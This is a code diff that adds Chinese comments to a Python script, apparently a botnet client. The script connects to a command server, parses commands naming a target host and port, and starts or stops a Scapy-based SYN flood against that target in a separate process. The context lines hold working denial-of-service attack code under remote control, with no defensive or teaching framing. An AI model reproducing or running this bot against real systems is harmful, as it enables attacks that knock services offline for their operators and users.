@@ -13,7 +13,7 @@ import os
 isWorking = False
 curProcess = None
 
-#
+
 def synFlood(tgt,dPort):
 	print('=' * 100)
 	print('The syn flood is running!')
@@ -26,25 +26,26 @@ def synFlood(tgt,dPort):
 		packet = ipLayer / tcpLayer
 		send(packet)
 
-#
-#
+#命令格式'#-H xxx.xxx.xxx.xxx -p xxxx -c <start>'   
+#处理命令
 def cmdHandle(sock, parser):
 	global curProcess
 	while True:
-		#
+		#接收命令
 		data = sock.recv(1024).decode('utf-8')
 		if len(data) == 0:
 			print('The data is empty!')
 			return 
 		if data[0] == '#':
 			try:
-				#
+				#解析命令
 				options = parser.parse_args(data[1:].split())
 				m_host = options.host
 				m_port = options.port
 				m_cmd = options.cmd
-				#
+				#启动命令
 				if m_cmd.lower() == 'start':
+					#如果已有进程在执行，在停止并清屏
 					if curProcess != None and curProcess.is_alive():
 						curProcess.terminate()
 						curProcess = None
@@ -53,7 +54,7 @@ def cmdHandle(sock, parser):
 					p = Process(target=synFlood, args=(m_host, m_port))
 					p.start()
 					curProcess = p
-				#
+				#停止
 				elif m_cmd.lower() == 'stop':
 					if curProcess.is_alive():
 						curProcess.terminate()
@@ -62,20 +63,20 @@ def cmdHandle(sock, parser):
 				print('Failed to perform the command!')
 
 def main():
-	#
+	#添加需要解析的命令
 	p = argparse.ArgumentParser()
 	p.add_argument('-H', dest='host', type=str)
 	p.add_argument('-p', dest='port', type=str)
 	p.add_argument('-c', dest='cmd', type=str)
 	print("*" * 40)
 	try:
-		#
+		#创建socket对象
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		#
+		#连接到服务器端
 		s.connect(('127.0.0.1', 58888))
 		print('To connected server was success!')
 		print("=" * 40)
-		#
+		#处理命令
 		cmdHandle(s, p)
 	except:
 		print('The network connected failed!')
